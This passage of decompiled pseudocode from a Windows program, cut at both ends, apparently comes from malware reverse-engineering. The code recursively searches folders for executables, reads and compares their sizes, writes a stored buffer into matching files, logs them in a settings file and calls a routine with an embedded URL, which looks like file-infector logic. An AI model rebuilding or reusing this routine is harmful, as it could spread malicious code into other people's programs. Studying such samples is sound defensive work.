  v14 = 0;
  v15 = &v40;
  while ( 1 )
  {
    v31 = v14 + 1;
    v28 = v15;
    *v15 = v14 + 1;
    v26 = v13;
    if ( v14 + 1 > v13 )
      break;
    v16 = (char *)dword_424557;
    sub_401107((int *)dword_424557);
    v21 = v17;
    v18 = v40 - 1;
    if ( v40 - 1 < 0 )
      v18 = sub_4022AB(4);
    if ( v18 >= v21 )
      v18 = sub_4022AB(1);
    lp = &v16[4 * v18];
    v38 = aExe;
    sub_401891((void **)lp, (int)&v38, 1);
    if ( v38 )
      sub_40229F(v38);
    sub_402175();
    v13 = v26;
    v15 = v28;
    v14 = v31;
  }
  v19 = (void *)sub_4025B0((void (__cdecl *)(_DWORD, _DWORD, _DWORD))sub_4073F0, 1, aHttpWwwBlackie, 0, -2147483644);
  if ( v19 )
    sub_40229F(v19);
  if ( v42 )
    sub_40229F(v42);
  if ( lpFileName )
    sub_40229F((void *)lpFileName);
  return 0;
}
// 401127: could not find valid save-restore pair for ebx
// 4012CC: conditional instruction was optimized away because %lpFileName.4==0
// 4012F5: conditional instruction was optimized away because %lpFileName.4==0
// 401376: conditional instruction was optimized away because %var_4.4==0
// 4015F2: variable 'v17' is possibly undefined
// 4022AB: using guessed type _DWORD __cdecl sub_4022AB(_DWORD);
// 424306: using guessed type double dbl_424306;
// 42430E: using guessed type _DWORD dword_42430E[2];

//----- (004016B6) --------------------------------------------------------
__int64 __stdcall sub_4016B6(_DWORD **a1)
{
  _DWORD *v1; // eax
  char *v2; // eax
  int *v3; // eax
  _DWORD *v4; // eax
  unsigned int v6; // [esp-8h] [ebp-10h]
  _DWORD *v7; // [esp-4h] [ebp-Ch]
  const CHAR *v8; // [esp-4h] [ebp-Ch]
  _DWORD *v9; // [esp+0h] [ebp-8h]
  int *lp; // [esp+4h] [ebp-4h]

  v1 = *a1;
  if ( *a1 )
  {
    v7 = *a1;
    v2 = sub_401000(v1);
    v1 = (_DWORD *)sub_4022A5((SIZE_T)(v2 + 1));
    qmemcpy(v1, v7, v6);
  }
  v8 = (const CHAR *)v1;
  if ( lpFileName )
    sub_40229F((void *)lpFileName);
  lpFileName = v8;
  v3 = (int *)sub_40106B((char)aUrl);
  lp = v3;
  if ( !v3 )
    v3 = (int *)&unk_424305;
  v9 = sub_402A20(1, v3, 0, 0x80000004);
  if ( lp )
    sub_40229F(lp);
  LOBYTE(v4) = (_BYTE)v9;
  if ( !v9 )
    v4 = dword_42430E;
  sub_4028A0(2, FileName, 0, -2147483644, (char)v4);
  if ( v9 )
    sub_40229F(v9);
  return sub_4025B0(sub_403B20, 1, FileName, 0, -2147483644);
}
// 4016DB: variable 'v6' is possibly undefined
// 42430E: using guessed type _DWORD dword_42430E[2];

//----- (004017BB) --------------------------------------------------------
void *sub_4017BB()
{
  void *result; // eax

  result = (void *)sub_4025B0((void (__cdecl *)(_DWORD, _DWORD, _DWORD))sub_4073F0, 1, aHttpWwwBlackie, 0, -2147483644);
  if ( result )
    return (void *)sub_40229F(result);
  return result;
}

//----- (004017F4) --------------------------------------------------------
int __cdecl sub_4017F4(__int16 *a1, _BYTE *a2)
{
  __int16 *v2; // edx
  _BYTE *v3; // ecx
  int result; // eax
  unsigned int v5; // eax
  bool v6; // cf
  unsigned int v7; // eax
  __int16 v8; // ax

  v2 = a1;
  v3 = a2;
  if ( a1 )
  {
    if ( !a2 )
      return *(_BYTE *)a1 != 0;
    if ( ((unsigned __int8)a1 & 3) == 0 )
      goto LABEL_9;
    if ( ((unsigned __int8)a1 & 1) != 0 )
    {
      v2 = (__int16 *)((char *)a1 + 1);
      v6 = *(_BYTE *)a1 < *a2;
      if ( *(_BYTE *)a1 != *a2 )
        return -2 * v6 + 1;
      v3 = a2 + 1;
      if ( !*(_BYTE *)a1 )
        return 0;
      if ( ((unsigned __int8)v2 & 2) == 0 )
        goto LABEL_9;
    }
    v8 = *v2++;
    v6 = (unsigned __int8)v8 < *v3;
    if ( (_BYTE)v8 == *v3 )
    {
      if ( !(_BYTE)v8 )
        return 0;
      v6 = HIBYTE(v8) < v3[1];
      if ( HIBYTE(v8) == v3[1] )
      {
        if ( HIBYTE(v8) )
        {
LABEL_9:
          for ( v3 += 2; ; v3 += 4 )
          {
            v5 = *(_DWORD *)v2;
            v6 = (unsigned __int8)*(_DWORD *)v2 < *v3;
            if ( (unsigned __int8)*(_DWORD *)v2 != *v3 )
              break;
            if ( !(_BYTE)v5 )
              return 0;
            v6 = BYTE1(v5) < v3[1];
            if ( BYTE1(v5) != v3[1] )
              break;
            if ( !BYTE1(v5) )
              return 0;
            v7 = HIWORD(v5);
            v6 = (unsigned __int8)v7 < v3[2];
            if ( (_BYTE)v7 != v3[2] )
              break;
            if ( !(_BYTE)v7 )
              return 0;
            v6 = BYTE1(v7) < v3[3];
            if ( BYTE1(v7) != v3[3] )
              break;
            v2 += 2;
            if ( !BYTE1(v7) )
              return 0;
          }
          return -2 * v6 + 1;
        }
        return 0;
      }
    }
    return -2 * v6 + 1;
  }
  result = 0;
  if ( a2 )
  {
    if ( *a2 )
      return -1;
  }
  return result;
}

//----- (00401891) --------------------------------------------------------
HANDLE __stdcall sub_401891(void **a1, int a2, int a3)
{
  const char *v3; // eax
  LPCSTR v4; // eax
  const CHAR *v5; // eax
  const CHAR *v6; // eax
  _DWORD *v7; // eax
  const char *v8; // eax
  const CHAR *v9; // eax
  const CHAR *v10; // eax
  const CHAR *v11; // eax
  _DWORD *v12; // eax
  _DWORD *v13; // eax
  const CHAR *v14; // eax
  const CHAR *v15; // eax
  LPCSTR v16; // eax
  LPCSTR v17; // eax
  const CHAR *v18; // eax
  const char *v19; // eax
  HANDLE result; // eax
  const CHAR *v21; // [esp-18h] [ebp-44h]
  const CHAR *v22; // [esp-18h] [ebp-44h]
  const CHAR *v23; // [esp-Ch] [ebp-38h]
  unsigned int v24; // [esp-8h] [ebp-34h]
  CHAR *v25; // [esp-4h] [ebp-30h]
  const CHAR *v26; // [esp-4h] [ebp-30h]
  CHAR *v27; // [esp-4h] [ebp-30h]
  CHAR *v28; // [esp-4h] [ebp-30h]
  void *v29; // [esp-4h] [ebp-30h]
  void *v30; // [esp-4h] [ebp-30h]
  void *v31; // [esp-4h] [ebp-30h]
  CHAR *v32; // [esp-4h] [ebp-30h]
  void *v33; // [esp-4h] [ebp-30h]
  HANDLE hFindFile; // [esp+0h] [ebp-2Ch] BYREF
  LPCSTR lpString; // [esp+4h] [ebp-28h]
  LPCSTR v36[2]; // [esp+8h] [ebp-24h]
  void *lp; // [esp+10h] [ebp-1Ch] BYREF
  HANDLE *v38; // [esp+14h] [ebp-18h]
  void *v39; // [esp+18h] [ebp-14h]
  void *v40; // [esp+1Ch] [ebp-10h]
  void *v41; // [esp+20h] [ebp-Ch]
  LPCSTR lpFileName; // [esp+24h] [ebp-8h]
  void *v43; // [esp+28h] [ebp-4h]

  hFindFile = 0;
  v43 = 0;
  lpFileName = 0;
  v41 = 0;
  v40 = 0;
  v39 = 0;
  v38 = 0;
  sub_402AE0();
  if ( sub_4017F4((__int16 *)*a1, &unk_424305) )
  {
    v3 = (const char *)*a1;
    if ( !*a1 )
      v3 = (const char *)&unk_424305;
    lp = sub_402B50(2, v3, 0, -2147483644, 1);
    v36[1] = (LPCSTR)(sub_4017F4((__int16 *)lp, asc_424303) != 0);
    if ( lp )
      sub_40229F(lp);
    if ( v36[1] )
    {
      lp = (void *)sub_40106B((char)*a1);
      if ( *a1 )
        sub_40229F(*a1);
      *a1 = lp;
    }
    lp = (void *)sub_40106B((char)*a1);
    v36[1] = (LPCSTR)sub_402BC0((LPCSTR)lp, 32, 0, &hFindFile);
    if ( lp )
      sub_40229F(lp);
    v25 = (CHAR *)v36[1];
    if ( v43 )
      sub_40229F(v43);
    v43 = v25;
    while ( sub_4017F4((__int16 *)v43, &unk_424305) )
    {
      lp = (void *)sub_40106B((char)*a1);
      v26 = (const CHAR *)lp;
      if ( lpFileName )
        sub_40229F((void *)lpFileName);
      lpFileName = v26;
      lp = sub_402D30(1, aWindir);
      v36[1] = (LPCSTR)sub_40106B((char)lp);
      if ( lp )
        sub_40229F(lp);
      v4 = lpFileName;
      if ( !lpFileName )
        v4 = (LPCSTR)&unk_424305;
      v21 = v4;
      v5 = v36[1];
      if ( !v36[1] )
        v5 = (const CHAR *)&unk_424305;
      v36[0] = (LPCSTR)sub_402D90(4, v5, 0, -2147483644, AppName, 0, -2147483644, v21, 0, -2147483644, 0);
      if ( v36[1] )
        sub_40229F((void *)v36[1]);
      v27 = (CHAR *)v36[0];
      if ( v41 )
        sub_40229F(v41);
      v41 = v27;
      v6 = lpFileName;
      if ( !lpFileName )
        v6 = (const CHAR *)&unk_424305;
      v7 = sub_402800(1, v6);
      lp = v7;
      if ( !v7 )
        v7 = dword_42430E;
      v36[1] = (LPCSTR)sub_4025B0((void (__cdecl *)(_DWORD, _DWORD, _DWORD))sub_404030, 1, v7, 0, -2147483643);
      if ( lp )
        sub_40229F(lp);
      v28 = (CHAR *)v36[1];
      if ( v40 )
        sub_40229F(v40);
      v40 = v28;
      if ( sub_4017F4((__int16 *)v41, v28) )
      {
        v8 = (const char *)*a1;
        if ( !*a1 )
          v8 = (const char *)&unk_424305;
        lp = sub_402B50(2, v8, 0, -2147483644, 10);
        v36[1] = sub_402D30(1, aWindir);
        v36[0] = (LPCSTR)(sub_4017F4((__int16 *)lp, v36[1]) != 0);
        if ( lp )
          sub_40229F(lp);
        if ( v36[1] )
          sub_40229F((void *)v36[1]);
        if ( v36[0] )
        {
          lp = sub_402D30(1, aWindir);
          v36[1] = (LPCSTR)sub_40106B((char)lp);
          if ( lp )
            sub_40229F(lp);
          v36[0] = (LPCSTR)(sub_4017F4((__int16 *)*a1, v36[1]) != 0);
          if ( v36[1] )
            sub_40229F((void *)v36[1]);
          if ( v36[0] )
          {
            v9 = lpFileName;
            if ( !lpFileName )
              v9 = (const CHAR *)&unk_424305;
            *(double *)v36 = (double)(int)sub_4027B0(1, v9);
            if ( *(double *)v36 - dbl_424513 < dbl_42451B )
            {
              v10 = lpFileName;
              if ( !lpFileName )
                v10 = (const CHAR *)&unk_424305;
              lp = sub_402800(1, v10);
              v29 = lp;
              if ( v39 )
                sub_40229F(v39);
              v39 = v29;
              sub_402AE0();
              v11 = lpFileName;
              if ( !lpFileName )
                v11 = (const CHAR *)&unk_424305;
              v38 = (HANDLE *)sub_402E30(3, v11, 0, -2147483644, 4, 0, -2147482879, 0, 0, 0);
              LOBYTE(v12) = (_BYTE)::lp;
              if ( !::lp )
                v12 = dword_42430E;
              sub_402F10(3, v38, 0, -2147482879, (char)v12);
              v13 = dword_42430E;
              if ( dword_42430E )
              {
                v13 = (_DWORD *)sub_4022A5(dword_42430E[1] + 8);
                qmemcpy(v13, dword_42430E, v24);
              }
              v30 = v13;
              if ( v39 )
                sub_40229F(v39);
              v39 = v30;
              sub_402AE0();
              lp = sub_402D30(1, aWindir);
              v36[1] = (LPCSTR)sub_40106B((char)lp);
              if ( lp )
                sub_40229F(lp);
              v14 = lpFileName;
              if ( !lpFileName )
                v14 = (const CHAR *)&unk_424305;
              v15 = (const CHAR *)sub_402800(1, v14);
              v36[0] = v15;
              if ( !v15 )
                v15 = (const CHAR *)dword_42430E;
              lpString = (LPCSTR)sub_4025B0(
                                   (void (__cdecl *)(_DWORD, _DWORD, _DWORD))sub_404030,
                                   1,
                                   v15,
                                   0,
                                   -2147483643);
              if ( v36[0] )
                sub_40229F((void *)v36[0]);
              v16 = lpString;
              if ( !lpString )
                v16 = (LPCSTR)&unk_424305;
              v23 = v16;
              v17 = lpFileName;
              if ( !lpFileName )
                v17 = (LPCSTR)&unk_424305;
              v22 = v17;
              v18 = v36[1];
              if ( !v36[1] )
                v18 = (const CHAR *)&unk_424305;
              sub_402FF0(4, v18, 0, -2147483644, AppName, 0, -2147483644, v22, 0, -2147483644, v23);
              if ( v36[1] )
                sub_40229F((void *)v36[1]);
              if ( lpString )
                sub_40229F((void *)lpString);
              sub_403010(1, v38);
              sub_402175();
            }
          }
        }
      }
      lp = (void *)sub_402BC0(0, 0, 1, &hFindFile);
      v31 = lp;
      if ( v43 )
        sub_40229F(v43);
      v43 = v31;
      sub_402AE0();
    }
    lp = (void *)sub_40106B((char)*a1);
    v36[1] = (LPCSTR)sub_402BC0((LPCSTR)lp, 16, 0, &hFindFile);
    if ( lp )
      sub_40229F(lp);
    v32 = (CHAR *)v36[1];
    if ( v43 )
      sub_40229F(v43);
    v43 = v32;
    while ( sub_4017F4((__int16 *)v43, &unk_424305) )
    {
      v19 = (const char *)v43;
      if ( !v43 )
        v19 = (const char *)&unk_424305;
      v36[1] = (LPCSTR)sub_403020(4, v19, 0, -2147483644, asc_424527, 0, -2147483644, 0, 0, 0, 0);
      if ( v36[1] == (LPCSTR)-1 )
      {
        lp = (void *)sub_40106B((char)*a1);
        sub_401891(&lp, a2, 1);
        if ( lp )
          sub_40229F(lp);
      }
      lp = (void *)sub_402BC0(0, 16, 0, &hFindFile);
      v33 = lp;
      if ( v43 )
        sub_40229F(v43);
      v43 = v33;
      sub_402AE0();
    }
  }
  result = sub_402D10(hFindFile);
  if ( v43 )
    result = (HANDLE)sub_40229F(v43);
  if ( lpFileName )
    result = (HANDLE)sub_40229F((void *)lpFileName);
  if ( v41 )
    result = (HANDLE)sub_40229F(v41);
  if ( v40 )
    result = (HANDLE)sub_40229F(v40);
  if ( v39 )
    return (HANDLE)sub_40229F(v39);
  return result;
}
// 401891: could not find valid save-restore pair for ebx
// 401DFD: variable 'v24' is possibly undefined
// 42430E: using guessed type _DWORD dword_42430E[2];
// 424513: using guessed type double dbl_424513;
// 42451B: using guessed type double dbl_42451B;

//----- (00402175) --------------------------------------------------------
int sub_402175()
{
  int result; // eax
  int *v1; // [esp+0h] [ebp-4h] BYREF

  v1 = (int *)&v1;
  result = SetProcessWorkingSetSize((HANDLE)0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF);
  if ( v1 != (int *)&v1 )
    return sub_4022AB(6);
  return result;
}
// 4022AB: using guessed type _DWORD __cdecl sub_4022AB(_DWORD);

//----- (004021B0) --------------------------------------------------------
int sub_4021B0()
{
  sub_4021C6();
  return 0;
}

//----- (004021C6) --------------------------------------------------------
void sub_4021C6()
{
  ;
}

//----- (004021CD) --------------------------------------------------------
int sub_4021CD()
{
  _DWORD *v0; // eax
  _DWORD *v1; // edi
  int result; // eax

  v0 = (_DWORD *)sub_4022A5(8u);
  dword_424557 = v0;
  *v0 = dword_42430E[0];
  v1 = v0 + 1;
  result = dword_42430E[1];
  *v1 = result;
  return result;
}
// 42430E: using guessed type _DWORD dword_42430E[2];

//----- (004021EB) --------------------------------------------------------
int sub_4021EB()
{
  char *v0; // ecx
  void **v1; // ebx
  bool v2; // zf
  int i; // eax
  char *v5; // [esp-8h] [ebp-8h]
  void *v6; // [esp-4h] [ebp-4h]

  if ( lpFileName )
    sub_40229F((void *)lpFileName);
  if ( lp )
    sub_40229F(lp);
  v6 = dword_424557;
  v0 = *(char **)dword_424557;
  v1 = (void **)((char *)dword_424557 + 4);
  v2 = *(_DWORD *)dword_424557 == 0;
  if ( *(_DWORD *)dword_424557 )
  {
    for ( i = (int)*v1; ; i *= (_DWORD)*v1 )
    {
      ++v1;
      if ( !--v0 )
        break;
    }
    v0 = (char *)i;
    v2 = i == 0;
  }
  if ( !v2 )
  {
    do
    {
      v5 = v0;
      if ( *v1 )
        sub_40229F(*v1);
      ++v1;
      v0 = v5 - 1;
    }
    while ( v5 != (char *)1 );
  }
  return sub_40229F(v6);
}

//----- (0040225A) --------------------------------------------------------
int sub_40225A()
{
  int v1; // [esp-4h] [ebp-4h]

  __asm { fninit }
  sub_4021CD();
  sub_402590((int)sub_4021EB);
  sub_4021B0();
  v1 = sub_401127();
  nullsub_1();
  return sub_40228D(v1);
}
// 402293: using guessed type int nullsub_1(void);

//----- (004022D0) --------------------------------------------------------
void ***sub_4022D0()
{
  return &off_41E400;
}
// 41E400: using guessed type void **off_41E400;

//----- (00402310) --------------------------------------------------------
LPVOID __thiscall sub_402310(LPVOID lpMem, char a2)
{
  sub_402330();
  if ( (a2 & 1) != 0 )
    sub_416688(lpMem);
  return lpMem;
}
// 402330: using guessed type int sub_402330(void);

//----- (00402340) --------------------------------------------------------
int sub_402340()
{
  unknown_libname_1();
  return atexit(unknown_libname_2);
}
// 402350: using guessed type int unknown_libname_1(void);

//----- (00402380) --------------------------------------------------------
int sub_402380()
{
  _DWORD v1[2]; // [esp+0h] [ebp-8h] BYREF
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  sub_4023B0();
  dword_429CB8 = (int)v1;
  dword_429CBC = (int)&savedregs;
  v1[1] = sub_40225A();
  return sub_41B0E3();
}
// 429CB8: using guessed type int dword_429CB8;
// 429CBC: using guessed type int dword_429CBC;

//----- (004023B0) --------------------------------------------------------
int (__stdcall *sub_4023B0())(int, int, int)
{
  int (__stdcall *result)(int, int, int); // eax
  int (__stdcall **i)(int, int, int); // esi

  hHeap = GetProcessHeap();
  result = off_4240F4[0];
  for ( i = off_4240F4; result; ++i )
  {
    result(1, (int)off_4240F0, 0);
    result = i[1];
  }
  return result;
}
// 4240F0: using guessed type int (__stdcall *off_4240F0)(int, LPVOID lpMem, SIZE_T dwBytes);
// 4240F4: using guessed type int (__stdcall *off_4240F4[3])(int, int, int);

//----- (004023C0) --------------------------------------------------------
int (*sub_4023C0())(void)
{
  int (__stdcall *v0)(int, int, int); // eax
  int (__stdcall **i)(int, int, int); // esi
  int (*result)(void); // eax

  if ( dword_429CD0 )
    dword_429CD0();
  if ( dword_429CD4 )
    dword_429CD4();
  if ( dword_429CD8 )
    dword_429CD8();
  v0 = off_4240F4[0];
  for ( i = off_4240F4; v0; ++i )
  {
    v0(6, 0, 0);
    v0 = i[1];
  }
  result = dword_429CE0;
  if ( dword_429CE0 )
    return (int (*)(void))dword_429CE0();
  return result;
}
// 429CD0: invalid function type '?' has been ignored
// 4240F4: using guessed type int (__stdcall *off_4240F4[3])(int, int, int);
// 429CD0: using guessed type int (*dword_429CD0)(void);
// 429CD4: using guessed type int (*dword_429CD4)(void);
// 429CD8: using guessed type int (*dword_429CD8)(void);
// 429CE0: using guessed type int (*dword_429CE0)(void);

//----- (004023F0) --------------------------------------------------------
HMODULE sub_4023F0()
{
  HMODULE result; // eax
  int v1; // ecx

  result = (HMODULE)lpModuleName;
  if ( !lpModuleName )
    result = GetModuleHandleA(0);
  v1 = *(_DWORD *)((char *)result + *((_DWORD *)result + 15) + 80);
  dword_429CC4 = (int)result;
  dword_429CCC = v1;
  dword_429CC0 = (int)result + v1;
  return result;
}
// 429CC0: using guessed type int dword_429CC0;
// 429CC4: using guessed type int dword_429CC4;
// 429CCC: using guessed type int dword_429CCC;

//----- (00402420) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
UINT __cdecl sub_402420()
{
  UINT retaddr; // [esp+4h] [ebp+4h]

  sub_4023C0();
  if ( !dword_429CB8 )
    ExitProcess(retaddr);
  return retaddr;
}
// 40244C: positive sp value 4 has been found
// 429CB8: using guessed type int dword_429CB8;

//----- (00402460) --------------------------------------------------------
UINT __usercall sub_402460@<eax>(int a1@<ebx>, int a2)
{
  CHAR Text[256]; // [esp+0h] [ebp-104h] BYREF
  int v4; // [esp+100h] [ebp-4h]

  v4 = a1;
  wsprintfA(Text, "program internal error number is %d. (0x%Xh)", a2, a1);
  MessageBoxA(0, Text, Caption, 0x10u);
  return sub_402420();
}

//----- (004024B0) --------------------------------------------------------
LPVOID __cdecl sub_4024B0(SIZE_T dwBytes)
{
  HANDLE ProcessHeap; // eax
  LPVOID v2; // esi

  ProcessHeap = hHeap;
  if ( !hHeap )
  {
    ProcessHeap = GetProcessHeap();
    hHeap = ProcessHeap;
  }
  v2 = HeapAlloc(ProcessHeap, 8u, dwBytes);
  if ( !v2 )
  {
    MessageBoxA(0, Text, Caption, 0x10u);
    sub_402420();
  }
  return v2;
}

//----- (00402500) --------------------------------------------------------
LPVOID __cdecl sub_402500(LPVOID lpMem, SIZE_T dwBytes)
{
  HANDLE ProcessHeap; // eax

  ProcessHeap = hHeap;
  if ( !hHeap )
  {
    ProcessHeap = GetProcessHeap();
    hHeap = ProcessHeap;
  }
  if ( lpMem )
    return HeapReAlloc(ProcessHeap, 0, lpMem, dwBytes);
  else
    return HeapAlloc(ProcessHeap, 8u, dwBytes);
}

//----- (00402540) --------------------------------------------------------
void __cdecl sub_402540(void *lp)
{
  if ( (unsigned int)lp > 0xFFFF )
  {
    if ( !dword_429CCC )
      sub_4023F0();
    if ( (dword_429CC4 > (unsigned int)lp || (unsigned int)lp > dword_429CC0) && !IsBadReadPtr(lp, 8u) )
      HeapFree(hHeap, 0, lp);
  }
}
// 429CC0: using guessed type int dword_429CC0;
// 429CC4: using guessed type int dword_429CC4;
// 429CCC: using guessed type int dword_429CCC;

//----- (00402590) --------------------------------------------------------
int __cdecl sub_402590(int a1)
{
  int result; // eax

  result = a1;
  dword_429CD0 = a1;
  return result;
}
// 429CD0: using guessed type int dword_429CD0;

//----- (004025B0) --------------------------------------------------------
__int64 __usercall sub_4025B0@<edx:eax>(void (__cdecl *a1)(_DWORD, _DWORD, _DWORD)@<eax>, int a2, ...)
{
  __int64 v3; // [esp+0h] [ebp-10h] BYREF
  int v4; // [esp+8h] [ebp-8h]
  void (__cdecl *v5)(_DWORD, _DWORD, _DWORD); // [esp+Ch] [ebp-4h]
  va_list va; // [esp+1Ch] [ebp+Ch] BYREF

  va_start(va, a2);
  v5 = a1;
  v3 = 0i64;
  v4 = 0;
  a1(&v3, a2, va);
  return v3;
}

//----- (00402650) --------------------------------------------------------
char *sub_402650()
{
  CHAR *v0; // eax
  char v1; // cl
  char *v2; // edx
  CHAR Filename[260]; // [esp+8h] [ebp-104h] BYREF

  if ( GetModuleFileNameA(0, Filename, 0x104u) )
  {
    v0 = &Filename[strlen(Filename) - 1];
    if ( *v0 == 92 )
    {
LABEL_5:
      *v0 = 0;
    }
    else
    {
      while ( v0 > Filename )
      {
        v1 = *--v0;
        if ( v1 == 92 )
          goto LABEL_5;
      }
    }
  }
  v2 = (char *)sub_4024B0(strlen(Filename) + 1);
  strcpy(v2, Filename);
  return v2;
}
// 402650: using guessed type CHAR Filename[260];

//----- (004026F0) --------------------------------------------------------
char *sub_4026F0()
{
  CHAR *v0; // esi
  CHAR *v1; // eax
  char v2; // cl
  char *v3; // edx
  CHAR Filename[260]; // [esp+8h] [ebp-104h] BYREF

  v0 = Filename;
  if ( GetModuleFileNameA(0, Filename, 0x104u) )
  {
    v1 = &Filename[strlen(Filename) - 1];
    if ( *v1 == 92 )
    {
LABEL_5:
      v0 = v1 + 1;
    }
    else
    {
      while ( v1 > Filename )
      {
        v2 = *--v1;
        if ( v2 == 92 )
          goto LABEL_5;
      }
    }
  }
  v3 = (char *)sub_4024B0(strlen(v0) + 1);
  strcpy(v3, v0);
  return v3;
}
// 4026F0: using guessed type CHAR Filename[260];

//----- (00402790) --------------------------------------------------------
BOOL __cdecl sub_402790(int a1, LPCSTR lpExistingFileName, int a3, int a4, LPCSTR lpNewFileName)
{
  return CopyFileA(lpExistingFileName, lpNewFileName, 0);
}

//----- (004027B0) --------------------------------------------------------
DWORD __cdecl sub_4027B0(int a1, LPCSTR lpFileName)
{
  DWORD result; // eax
  void *v3; // esi
  DWORD FileSize; // edi

  result = (DWORD)CreateFileA(lpFileName, 0x80000000, 3u, 0, 3u, 0x20u, 0);
  v3 = (void *)result;
  if ( result != -1 )
  {
    FileSize = GetFileSize((HANDLE)result, (LPDWORD)&lpFileName);
    CloseHandle(v3);
    if ( lpFileName == (LPCSTR)-1 )
      return -1;
    else
      return FileSize;
  }
  return result;
}

//----- (00402800) --------------------------------------------------------
_DWORD *__cdecl sub_402800(int a1, LPCSTR lpFileName)
{
  HANDLE FileA; // edi
  _DWORD *result; // eax
  DWORD FileSize; // ebx
  _DWORD *v5; // esi

  FileA = CreateFileA(lpFileName, 0x80000000, 3u, 0, 3u, 0x20u, 0);
  result = 0;
  if ( FileA != (HANDLE)-1 )
  {
    FileSize = GetFileSize(FileA, (LPDWORD)&lpFileName);
    v5 = sub_4024B0(FileSize + 8);
    *v5 = 1;
    v5[1] = FileSize;
    ReadFile(FileA, v5 + 2, FileSize, (LPDWORD)&lpFileName, 0);
    CloseHandle(FileA);
    return v5;
  }
  return result;
}

//----- (00402870) --------------------------------------------------------
_DWORD *__cdecl sub_402870(int a1, int a2, int a3, int a4, signed int a5)
{
  int v5; // eax
  int v6; // eax

  if ( !a2 )
    return 0;
  v5 = *(_DWORD *)(a2 + 4);
  if ( !v5 || a5 <= 0 )
    return 0;
  v6 = v5 - a5;
  if ( v6 < 0 )
    v6 = 0;
  return sub_403650((const void *)(a2 + v6 + 8), a5);
}

//----- (004028A0) --------------------------------------------------------
int __cdecl sub_4028A0(int a1, LPCSTR lpFileName, int a3, int a4, char a5)
{
  HANDLE FileA; // edi
  int result; // eax
  int v7; // ebx
  char *v8; // esi
  int v9; // [esp+4h] [ebp-8h]
  DWORD NumberOfBytesWritten; // [esp+8h] [ebp-4h] BYREF

  FileA = CreateFileA(lpFileName, 0x40000000u, 0, 0, 2u, 0x20u, 0);
  result = 0;
  if ( FileA != (HANDLE)-1 )
  {
    v7 = 1;
    v9 = 1;
    if ( a1 > 1 )
    {
      v8 = &a5;
      while ( WriteFile(FileA, (LPCVOID)(*(_DWORD *)v8 + 8), *(_DWORD *)(*(_DWORD *)v8 + 4), &NumberOfBytesWritten, 0) )
      {
        ++v7;
        v8 += 12;
        if ( v7 >= a1 )
          goto LABEL_8;
      }
      v9 = 0;
    }
LABEL_8:
    CloseHandle(FileA);
    return v9;
  }
  return result;
}

//----- (00402940) --------------------------------------------------------
const char *__cdecl sub_402940(int a1, _DWORD *a2)
{
  unsigned int v2; // eax
  const char *result; // eax

  v2 = *(_DWORD *)(a1 + 8);
  if ( v2 > 0x80000101 )
  {
    if ( v2 > 0x80000401 )
    {
      if ( v2 == -2147482367 )
        goto LABEL_12;
      if ( v2 == -2147482111 )
      {
        *a2 = 8;
        return (const char *)a1;
      }
    }
    else
    {
      switch ( v2 )
      {
        case 0x80000401:
LABEL_14:
          result = (const char *)a1;
          *a2 = 8;
          return result;
        case 0x80000201:
          *a2 = 2;
          return (const char *)a1;
        case 0x80000301:
LABEL_12:
          result = (const char *)a1;
          *a2 = 4;
          return result;
      }
    }
    return 0;
  }
  if ( v2 == -2147483391 )
  {
    *a2 = 1;
    return (const char *)a1;
  }
  else
  {
    switch ( v2 )
    {
      case 0x80000002:
      case 0x80000006:
        *a2 = 4;
        result = (const char *)a1;
        break;
      case 0x80000003:
        goto LABEL_14;
      case 0x80000004:
        *a2 = strlen(*(const char **)a1) + 1;
        result = *(const char **)a1;
        break;
      case 0x80000005:
        result = (const char *)(*(_DWORD *)a1 + 8);
        *a2 = *(_DWORD *)(*(_DWORD *)a1 + 4);
        break;
      default:
        return 0;
    }
  }
  return result;
}

//----- (00402A20) --------------------------------------------------------
_DWORD *__cdecl sub_402A20(int a1, int *a2, int a3, unsigned int a4)
{
  unsigned int v4; // esi
  int v5; // eax
  int *v6; // eax
  const char *v8; // eax
  unsigned int v9; // [esp+4h] [ebp-8h] BYREF
  unsigned int v10; // [esp+8h] [ebp-4h] BYREF

  v4 = a4 & 0xDFFFFFFF;
  v5 = (a4 >> 29) & 1;
  if ( (a4 & 0xDFFFFFFF) == -2147483391 )
  {
    if ( v5 == 1 )
    {
      v6 = sub_4036C0(a2, (int *)&v10);
      v9 = v10;
      return sub_403650(v6, v10);
    }
  }
  else if ( v5 == 1 )
  {
    return 0;
  }
  if ( sub_403690(a4 & 0xDFFFFFFF) != 1 )
    return 0;
  if ( v4 == -2147483644 )
    return sub_403650(a2, strlen((const char *)a2));
  v8 = sub_402940((int)&a2, &v9);
  return sub_403650(v8, v9);
}

//----- (00402AE0) --------------------------------------------------------
BOOL sub_402AE0()
{
  BOOL result; // eax
  struct tagMSG Msg; // [esp+10h] [ebp-1Ch] BYREF

  for ( result = PeekMessageA(&Msg, 0, 0, 0, 0); result; result = PeekMessageA(&Msg, 0, 0, 0, 0) )
  {
    if ( Msg.message == 18 )
      break;
    GetMessageA(&Msg, 0, 0, 0);
    TranslateMessage(&Msg);
    DispatchMessageA(&Msg);
  }
  return result;
}

//----- (00402B50) --------------------------------------------------------
char *__cdecl sub_402B50(int a1, const char *a2, int a3, int a4, int a5)
{
  unsigned int v5; // kr04_4
  int v6; // eax
  const char *v7; // esi
  char *v8; // edx

  v5 = strlen(a2) + 1;
  if ( v5 == 1 || a5 <= 0 )
    return 0;
  v6 = v5 - 1 - a5;
  if ( v6 < 0 )
    v6 = 0;
  v7 = &a2[v6];
  v8 = (char *)sub_4024B0(strlen(&a2[v6]) + 1);
  strcpy(v8, v7);
  return v8;
}

//----- (00402BC0) --------------------------------------------------------
BOOL __cdecl sub_402BC0(LPCSTR lpFileName, int a2, int a3, HANDLE *a4)
{
  HANDLE FirstFileA; // esi
  BOOL result; // eax
  char *v6; // edx
  int v7; // [esp+10h] [ebp-144h]
  struct _WIN32_FIND_DATAA FindFileData; // [esp+14h] [ebp-140h] BYREF

  FirstFileA = *a4;
  v7 = 0;
  if ( lpFileName && strlen(lpFileName) )
  {
    if ( FirstFileA && FirstFileA != (HANDLE)-1 )
      FindClose(FirstFileA);
    FirstFileA = FindFirstFileA(lpFileName, &FindFileData);
    *a4 = FirstFileA;
    if ( FirstFileA == (HANDLE)-1 )
      return 0;
    if ( a3 )
    {
      if ( (FindFileData.dwFileAttributes & 0x10) != 16 )
        goto LABEL_11;
    }
    else if ( (FindFileData.dwFileAttributes & a2) != 0 )
    {
LABEL_11:
